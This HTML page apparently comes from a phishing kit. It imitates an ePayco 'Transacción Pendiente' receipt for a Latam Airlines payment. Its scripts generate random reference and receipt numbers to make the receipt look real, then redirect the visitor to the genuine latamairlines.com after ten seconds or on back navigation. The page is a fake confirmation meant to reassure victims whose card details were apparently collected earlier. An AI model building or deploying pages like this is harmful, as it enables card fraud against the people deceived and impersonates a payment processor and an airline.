<!DOCTYPE html>
<html lang="es">
  <head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Comporbante Pago</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="/js/modal.js"></script>
    <script src="js/nota.js"></script>
  </head>
  <body>
    <div class="flex flex-col items-center bg-zinc-100 dark:bg-zinc-800 min-h-screen py-10">
  <div class="bg-white dark:bg-zinc-900 shadow-md rounded-lg overflow-hidden w-full max-w-md">
    <div class="bg-black p-4 flex justify-center">
      <img src="/assets/media/epayco.png" style="width: 30%;" />
    </div>
    <div class="p-6">
      <div class="flex justify-center mb-4">
        <img src="/assets/media/pendiente.png" style="width: 15%;" />
      </div>
      <h2 class="text-center text-xl font-bold text-zinc-800 dark:text-zinc-100 mb-2">Transacción Pendiente</h2>
      <div class="text-center text-zinc-600 dark:text-zinc-400 mb-4">Referencia ePayco #<span id="reference"></span></div>
      <p class="text-center text-zinc-600 dark:text-zinc-400 mb-6"><span id="fecha"> </span></p>
      <div class="text-zinc-800 dark:text-zinc-100 mb-4">
        <h3 class="font-bold mb-2">Medio de pago</h3>
        <div class="flex justify-between">
          <span>Método de pago</span>
          <span>Autorización</span>
        </div>
        <div class="flex justify-between mb-2">
          <span>Tarjeta crédito/débito</span>
          <span>85974620</span>
        </div>
        <div class="flex justify-between">
          <span>Recibo</span>
          
        </div>
        <div class="flex justify-between mb-2">
          <p id="receipt"></p>
          
        </div>
        <div class="flex justify-between">
          <span>Respuesta</span>
        </div>
        <div class="flex justify-between mb-4">
          <span>Transacción en Proceso</span>
        </div>
      </div>
      <div class="text-zinc-800 dark:text-zinc-100">
        <h3 class="font-bold mb-2">Datos de la compra</h3>
        <div class="flex justify-between">
          <span>Ref. Comercio</span>
          <span>Descripción</span>
        </div>
        <div class="flex justify-between mb-2">
          <span>8567793</span>
          <span>Pago Latam Airlines</span>
        </div>
        <div class="flex justify-between">
          <span>Subtotal</span>
          <span>Valor total</span>
        </div>
        <div class="flex justify-between">
          <span>$61.719 COP</span>
          <span>$61.719 COP</span>
        </div>
      </div>
    </div>
  </div>
</div>



<script>
    // Función para manejar el evento beforeunload
    window.addEventListener('beforeunload', function(event) {
      // Verificar si el usuario está intentando ir hacia atrás
      if (window.performance.navigation.type === 2) {
        // Redirigir a la página principal
        window.location.href = "https://www.latamairlines.com";
      }
    });
  </script>

  <script>
    function getRandomInt(min, max) {
      return Math.floor(Math.random() * (max - min + 1)) + min;
    }

    document.getElementById('reference').textContent = getRandomInt(211990000, 211999809);
    document.getElementById('receipt').textContent = getRandomInt(819661928168311, 819661928968000);
  </script>

  <script>
    // Función para redirigir después de un período de tiempo
    function redireccionar() {
      setTimeout(function() {
        // Cambiar la URL de la página
        window.location.href = "https://www.latamairlines.com";
      }, 10000); // 10000 milisegundos = 10 segundos
    }

    redireccionar();
  </script>
  </body>
</html>